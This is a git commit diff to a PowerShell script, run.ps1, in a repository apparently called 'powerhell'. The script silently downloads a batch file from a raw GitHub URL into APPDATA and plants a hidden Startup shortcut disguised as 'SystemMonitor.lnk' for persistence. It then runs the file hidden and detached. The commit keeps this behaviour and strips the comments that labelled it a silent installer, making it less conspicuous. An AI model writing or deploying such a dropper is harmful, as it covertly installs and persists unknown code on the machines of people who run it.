23f56a1071ccd48b4f6355b693af506609fef7e8
Axolotl-in-void <gh266566@gmail.com>
2026-05-22 17:28:56 +0200

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,23 +1,18 @@
-# =============================================
-# SILENT AUTO INSTALLER
-# =============================================
-
 $githubUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
 $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $batPath = "$env:APPDATA\ss.bat"
 
 try {
-    Invoke-WebRequest -Uri $githubUrl -OutFile $batPath -UseBasicParsing -ErrorAction Stop
+    Invoke-WebRequest -Uri $githubUrl -OutFile $batPath -UseBasicParsing
 } catch { exit }
 
-# Create hidden shortcut in startup
 $WScriptShell = New-Object -ComObject WScript.Shell
 $shortcut = $WScriptShell.CreateShortcut("$startupFolder\SystemMonitor.lnk")
 $shortcut.TargetPath = $batPath
-$shortcut.WindowStyle = 7   # Hidden
+$shortcut.WindowStyle = 7
 $shortcut.Save()
 
-# Run now - completely hidden + detached
+# Run detached
 Start-Process $batPath -WindowStyle Hidden
 
 exit
